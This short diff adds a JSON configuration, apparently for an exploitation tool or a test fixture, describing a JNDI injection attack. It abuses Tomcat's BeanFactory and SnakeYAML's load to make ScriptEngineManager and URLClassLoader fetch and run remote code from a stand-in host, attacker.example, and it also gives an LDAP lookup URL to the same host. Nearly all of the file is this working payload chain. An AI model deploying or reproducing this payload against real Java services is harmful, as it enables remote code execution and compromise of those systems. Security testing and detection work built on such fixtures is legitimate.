@@ -1,0 +1,12 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "org.apache.naming.factory.BeanFactory",
+    "reference_class": "org.yaml.snakeyaml.Yaml",
+    "factory_attrs": {
+        "forceString": "x=load",
+        "x": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://attacker.example/exploit']]]]"
+    },
+    "sink_type": "yaml_load",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
